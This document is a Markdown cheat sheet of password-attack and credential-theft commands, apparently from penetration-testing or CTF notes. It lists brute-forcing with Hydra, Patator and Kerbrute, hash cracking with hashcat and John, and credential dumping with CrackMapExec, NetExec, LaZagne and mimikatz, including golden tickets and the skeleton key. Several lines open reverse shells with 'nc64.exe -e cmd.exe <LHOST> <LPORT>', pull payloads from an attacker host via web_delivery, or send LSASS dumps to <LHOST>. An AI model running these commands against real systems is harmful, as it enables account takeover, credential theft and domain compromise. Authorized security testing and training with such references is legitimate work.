# Password Attacks

- [Resources](#resources)

## Table of Contents

- [AES](#aes)
- [bkcrack](#bkcrack)
- [CrackMapExec](#crackmapexec)
- [fcrack](#fcrack)
- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
- [Hash-Buster](#hash-buster)
- [hashcat](#hashcat)
- [Hydra](#hydra)
- [John](#john)
- [Kerbrute](#kerbrute)
- [LaZagne](#lazagne)
- [LUKS](#luks)
- [Medusa](#medusa)
- [mimikatz](#mimikatz)
- [MultiDump](#multidump)
- [NetExec](#netexec)
- [Patator](#patator)
- [PDFCrack](#pdfcrack)
- [pypykatz](#pypykatz)
- [RsaCtfTool](#rsactftool)
- [SprayingToolkit](#sprayingtoolkit)
- [VNC Password Recovery](#vnc-password-recovery)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
| bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
| CrackMapExec | CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. | https://github.com/byt3bl33d3r/CrackMapExec |
| CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
| Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DeHashed | Breach Database | https://dehashed.com |
| DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! | https://github.com/dafthack/DomainPasswordSpray |
| Firefox Decrypt | Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles | https://github.com/unode/firefox_decrypt |
| go-mimikatz | A wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion. | https://github.com/vyrus001/go-mimikatz |
| hashcat | Password Cracking | https://hashcat.net/hashcat |
| Hob0Rules | Password cracking rules for Hashcat based on statistics and industry patterns | https://github.com/praetorian-inc/Hob0Rules |
| Hydra | Password Brute Force | https://github.com/vanhauser-thc/thc-hydra |
| John | Password Cracking | https://github.com/openwall/john |
| keepass-dump-masterkey | Script to retrieve the master password of a keepass database <= 2.53.1 | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | A python tool to automate KeePass discovery and secret extraction. | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. | https://github.com/ropnop/kerbrute |
| LaZagne | The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. | https://github.com/AlessandroZ/LaZagne |
| mimikatz | Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. | https://github.com/gentilkiwi/mimikatz |
| MultiDump | MultiDump is a post-exploitation tool for dumping and extracting LSASS memory discreetly. | https://github.com/Xre0uS/MultiDump |
| NetExec | The Network Execution Tool | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | This website offers a NTLM to plaintext password "cracking" service, using a custom high performance database with billions of precomputed password hashes. | https://ntlm.pw |
| Patator | Password Brute Force | https://github.com/lanjelot/patator |
| pypykatz | Mimikatz implementation in pure Python. | https://github.com/skelsec/pypykatz |
| RsaCtfTool | RSA multi attacks tool : uncipher data from weak public key and try to recover private key Automatic selection of best attack for the given public key. | https://github.com/Ganapati/RsaCtfTool |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| SprayingToolkit | A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient. | https://github.com/byt3bl33d3r/SprayingToolkit |
| TheSprayer | TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain without locking out accounts. | https://github.com/coj337/TheSprayer |
| TREVORspray | TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! | https://github.com/blacklanternsecurity/TREVORspray |

## AES

### Cracking AES Encryption

#### Create AES File

```c
aes-256-ctr
aes-128-ofb
aes-192-ofb
aes-256-ofb
aes-128-ecb
aes-192-ecb
aes-256-ecb
```

#### Create String File

```c
Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
```

#### For Loop

```c
$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
```

## bkcrack

### Cracking .zip File

```c
$ ./bkcrack -L <FILE>.zip
```

```c
$ cat plaintext.txt
Secret:HTB{
```

```c
$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
```

## CrackMapExec

> https://github.com/byt3bl33d3r/CrackMapExec

### Installation via Poetry

```c
$ pipx install poetry
$ git clone https://github.com/Porchetta-Industries/CrackMapExec
$ cd CrackMapExec
$ poetry install
$ poetry run crackmapexec
```

### Modules

```c
$ crackmapexec ldap -L
$ crackmapexec mysql -L
$ crackmapexec smb -L
$ crackmapexec ssh -L
$ crackmapexec winrm -L
```

### Common Commands

```c
$ crackmapexec smb <RHOST> -u '' -p '' --shares
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ crackmapexec smb <RHOST> -u " " -p "" --shares
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
$ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ crackmapexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
$ crackmapexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
$ crackmapexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
$ crackmapexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
```

## fcrack

```c
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

## Group Policy Preferences (GPP)

### gpp-decrypt

> https://github.com/t0thkr1s/gpp-decrypt

```c
$ python3 gpp-decrypt.py -f Groups.xml
$ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## Hash-Buster

> https://github.com/s0md3v/Hash-Buster

```c
$ buster -s 2b6d315337f18617ba18922c0b9597ff
```

## hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

### Hash Example Search

```c
$ hashcat --example-hashes
$ hashcat --help | grep -i "ntlm"
```

### Mask File Example

> https://hashcat.net/wiki/doku.php?id=mask_attack

#### example.hcmask

```
FOOBAR?d?d?d?d
FOOBAR?d?d?d?u
FOOBAR?d?d?u?u
FOOBAR?d?u?u?u
FOOBAR?u?u?u?u
```

### Common Commands

```c
$ hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
$ hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
$ hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
$ hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
$ hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
$ hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
$ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

### Cracking ASPREPRoast Password File

```c
$ hashcat -m 18200 -a 0 <FILE> <FILE>
```

### Cracking Kerberoasting Password File

```c
$ hashcat -m 13100 --force <FILE> <FILE>
```

### Bruteforce based on the Pattern

```c
$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate Password Candidates: Wordlist + Pattern

```c
$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

### Crack with hashcat

```c
$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```c
$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

## Hydra

> https://github.com/vanhauser-thc/thc-hydra

### Common Commands

```c
$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
$ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
```

### Proxy

```c
$ export HYDRA_PROXY=connect://127.0.0.1:8080
$ unset HYDRA_PROXY
```

### SSH

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
```

### FTP

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
```

### SMB

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
```

### MySQL

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
```

### Postgres

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
```

### Telnet

```c
$ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
```

### VNC

```c
$ hydra <RHOST> -P passwords.txt vnc -V
```

### Docker Registry

```c
$ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
```

### Webform

```c
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

## John

> https://github.com/openwall/john

```c
$ john md5 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
$ john sha-1 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
$ john sha256 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
$ john bcrypt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
$ john md4 --wordlist=/usr/share/wordlists/rockyou.txt --format=md4
$ john ntlm --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
$ john sha512 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Using Salt

```c
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --mask='<SALT>?w'
```

### Cracking RSA

```c
$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```

### Cracking Kerberoasting Password File

```c
$ john --format=krb5tgs --wordlist=<FILE> <FILE>
```

### Cracking EncFS/6

```c
$ /usr/share/john/encfs2john.py directory/ > encfs6.xml.john
$ john encfs6.xml.john --wordlist=/usr/share/wordlists/rockyou.txt
```

### Extracting Hash from .kdbx File

```c
$ keepass2john <FILE>.kdbx
```

### Cracking .zip-Files

```c
$ zip2john <FILE> > output.hash
```

### Show cracked Password

```c
$ john --show <FILE>
```

## Kerbrute

> https://github.com/ropnop/kerbrute

### User Enumeration

```c
$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

### Password Spray

```c
$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

## LaZagne

> https://github.com/AlessandroZ/LaZagne

```c
C:\> laZagne.exe all
```

## LUKS

### Extracting LUKS Header

```c
$ dd if=backup.img of=header.luks bs=512 count=4097
```

## Medusa

```c
$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
```

## mimikatz

> https://github.com/gentilkiwi/mimikatz

### Common Commands

```c
mimikatz # token::elevate
mimikatz # token::revert
mimikatz # vault::cred
mimikatz # vault::list
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

### Execute mimikatz Inline

This is helpful when executing within a `Evil-WinRM` session.

```c
C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

### Dump Hashes

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
mimikatz # sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Overpass-the-hash / Pass-the-Key

```c
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

#### RC4

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES128

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### AES256

```c
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

### Pass the Ticket

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Forging Golden Ticket

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Skeleton Key

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

### Data Protection API (DPAPI) Decryption

> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

#### rpc

```c
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```c
mimikatz # dpapi::cache
```

```c
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## MultiDump

> https://github.com/Xre0uS/MultiDump

```c
$ python3 MultiDumpHandler.py -r <LPORT>
```

```c
PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

```c
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```c
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```c
$ netexec ldap -L
$ netexec mysql -L
$ netexec smb -L
$ netexec ssh -L
$ netexec winrm -L
```

### Common Commands

```c
$ netexec smb <RHOST> -u '' -p '' --shares
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u " " -p "" --shares
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --users
$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
$ netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
$ netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M get-network -o ALL=true
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
$ netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
$ netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
$ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
```

## Patator

> https://github.com/lanjelot/patator

```c
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:mesg='Authentication failed.'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:fgrep='failed'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:egrep='failed'
```

## PDFCrack

```c
$ pdfcrack -f file.pdf -w /usr/share/wordlists/rockyou.txt
```

## pypykatz

> https://github.com/skelsec/pypykatz

```c
$ pypykatz lsa minidump lsass.dmp
$ pypykatz registry --sam sam system
```

## RsaCtfTool

> https://github.com/Ganapati/RsaCtfTool

```c
$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
```

## SprayingToolkit

> https://github.com/byt3bl33d3r/SprayingToolkit

### OWA

```c
$ python3 atomizer.py owa <RHOST> <PASSWORDS>.txt <USERNAMES>.txt -i 0:0:01
```

## VNC Password Recovery

```c
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```
